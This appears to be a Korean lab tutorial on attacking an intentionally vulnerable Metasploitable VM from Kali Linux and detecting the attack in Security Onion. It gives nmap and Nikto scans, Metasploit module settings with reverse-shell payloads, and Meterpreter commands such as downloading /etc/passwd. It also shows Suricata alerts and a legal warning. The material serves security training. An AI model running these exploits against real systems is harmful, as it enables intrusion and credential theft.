Kali Linux & Metasploit

Kali Linux의 도구들을 활용하여 Metasploitable 서버를 공격하고, Security Onion에서 탐지하는 실습입니다.

공격 시나리오 개요​

1. 정보 수집 (Reconnaissance)​

1.1 네트워크 대역 스캔​

먼저 네트워크에 어떤 호스트가 있는지 확인합니다.

# Netdiscover - ARP 스캔
sudo netdiscover -r 192.168.2.0/24

# Nmap - Ping 스캔
nmap -sn 192.168.2.0/24

결과 예시:

192.168.2.2    - Gateway
192.168.2.209  - Metasploitable
192.168.2.240  - Security Onion
192.168.2.13   - Windows 10

1.2 대상 호스트 스캔​

Metasploitable(192.168.2.209)을 상세 스캔합니다.

# 기본 포트 스캔
nmap 192.168.2.209

# SYN 스캔 (스텔스)
nmap -sS 192.168.2.209

# 서비스 버전 확인
nmap -sV 192.168.2.209

# OS 탐지
nmap -O 192.168.2.209

# 전체 스캔 (시간 오래 걸림)
nmap -A 192.168.2.209

1.3 결과 분석​

발견되는 주요 서비스:

포트서비스버전취약점
21FTPvsftpd 2.3.4Backdoor
22SSHOpenSSH 4.7p1구버전
23Telnet-평문 전송
80HTTPApache 2.2.8다수 취약점

취약점 확인 방법

발견된 버전 정보로 Exploit-DB에서 취약점을 검색합니다.

2. 웹 취약점 스캔 (Nikto)​

2.1 Nikto 기본 스캔​

nikto -h 192.168.2.209

옵션:

# 특정 포트
nikto -h 192.168.2.209 -p 80

# 출력 저장
nikto -h 192.168.2.209 -o scan_result.txt

# SSL 사이트
nikto -h https://target.com -ssl

2.2 결과 분석​

Nikto가 발견하는 취약점:

  • 디렉토리 리스팅
  • 기본 파일 노출 (/phpinfo.php, /phpMyAdmin)
  • 구버전 소프트웨어
  • 보안 헤더 누락

3. Metasploit 공격 실습​

3.1 Metasploit 시작​

# Metasploit 콘솔 시작
msfconsole

시작 화면:

  • 익스플로잇 개수: 2400+
  • 페이로드 개수: 1600+
  • 보조 모듈: 1300+

3.2 용어 설명​

용어설명비유
Exploit취약점 공격 코드미사일 탄두
Payload실행할 코드미사일 본체
Bind Shell대상이 포트 열고 대기밖에서 안으로
Reverse Shell대상이 공격자에게 연결안에서 밖으로

3.3 PHP CGI 취약점 공격​

모듈 검색:

msf6 > search php_cgi

모듈 선택:

msf6 > use exploit/multi/http/php_cgi_arg_injection

옵션 확인:

msf6 exploit(php_cgi_arg_injection) > show options

필수 설정:

# 대상 IP 설정
msf6 > set RHOSTS 192.168.2.209

# 페이로드 선택 (Reverse Shell)
msf6 > set payload php/meterpreter/reverse_tcp

# 공격자 IP 설정 (Kali)
msf6 > set LHOST 192.168.2.210

공격 실행:

msf6 > exploit
# 또는
msf6 > run

3.4 Meterpreter 세션​

공격 성공 시 Meterpreter 쉘 획득:

# 시스템 정보
meterpreter > sysinfo

# 현재 사용자
meterpreter > getuid

# 쉘 획득
meterpreter > shell

# 파일 다운로드
meterpreter > download /etc/passwd

# 스크린샷
meterpreter > screenshot

# 도움말
meterpreter > help

3.5 세션 종료​

# Meterpreter 종료
meterpreter > exit

# 세션 백그라운드
meterpreter > background

# 세션 목록
msf6 > sessions -l

# 세션 재접속
msf6 > sessions -i 1

4. 추가 공격 모듈​

4.1 vsftpd Backdoor​

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.2.209
msf6 > exploit

4.2 Samba (MS17-010 유사)​

msf6 > use exploit/multi/samba/usermap_script
msf6 > set RHOSTS 192.168.2.209
msf6 > set payload cmd/unix/reverse
msf6 > set LHOST 192.168.2.210
msf6 > exploit

4.3 PostgreSQL​

msf6 > use exploit/linux/postgres/postgres_payload
msf6 > set RHOSTS 192.168.2.209
msf6 > exploit

5. Security Onion 탐지 확인​

5.1 실시간 로그 확인​

# Suricata Fast 로그
sudo tail -f /var/log/suricata/fast.log

탐지 예시:

[**] [1:2024217:3] ET SCAN Potential SSH Scan [**]
[**] [1:2010935:3] ET POLICY PHP CGI Exploits [**]
[**] [1:2002911:5] ET EXPLOIT Metasploit Meterpreter [**]

5.2 Sguil 분석​

  1. Sguil 실행
  2. 이벤트 목록 확인
  3. 카테고리 분류:
    • CAT I: Metasploit 공격
    • CAT VI: Nmap 스캔

6. Exploit-DB 활용​

6.1 웹사이트 검색​

exploit-db.com에서:

  1. 서비스명 + 버전 검색
  2. 검증된 익스플로잇 확인
  3. 코드 다운로드

6.2 searchsploit 명령어​

# 로컬 검색
searchsploit vsftpd 2.3.4
searchsploit apache 2.2.8
searchsploit samba 3.0

# 상세 정보
searchsploit -x 17491

# 복사
searchsploit -m 17491

빠른 명령어 참조​

Nmap 스캔​

# 기본 스캔
nmap 192.168.2.209

# 서비스 버전
nmap -sV 192.168.2.209

# OS 탐지
nmap -O 192.168.2.209

# 전체 스캔
nmap -A 192.168.2.209

# 스텔스 스캔
nmap -sS 192.168.2.209

# 빠른 스캔
nmap -F 192.168.2.209

Nikto​

nikto -h 192.168.2.209

Metasploit​

# 시작
msfconsole

# 검색
search [키워드]

# 모듈 선택
use [모듈명]

# 옵션 확인
show options

# 필수 설정
set RHOSTS [대상IP]
set LHOST [공격자IP]
set payload [페이로드]

# 공격
exploit

# 세션 목록
sessions -l

# 세션 접속
sessions -i [번호]

Meterpreter​

# 시스템 정보
sysinfo

# 사용자 확인
getuid

# 쉘 획득
shell

# 종료
exit

# 백그라운드
background

트러블슈팅 체크리스트​

Metasploit 공격 실패​

  • RHOSTS 설정 확인 (대상 IP)
  • LHOST 설정 확인 (공격자 IP)
  • 대상 서비스 실행 중인지 확인
  • 방화벽 설정 확인
  • Exploit Rank 확인 (Excellent 권장)

Meterpreter 연결 끊김​

  • 네트워크 연결 상태 확인
  • LHOST가 올바른지 확인
  • 방화벽이 리버스 연결 차단하는지 확인

Nmap 결과 없음​

  • 대상 IP 확인
  • 네트워크 연결 확인 (ping)
  • 방화벽 설정 확인

주의사항​

법적 경고
  • 모든 공격은 허가된 환경에서만 수행
  • 실제 시스템 공격은 불법
  • Metasploitable은 교육용 취약 서버
  • 절대 인터넷에 노출하지 말 것
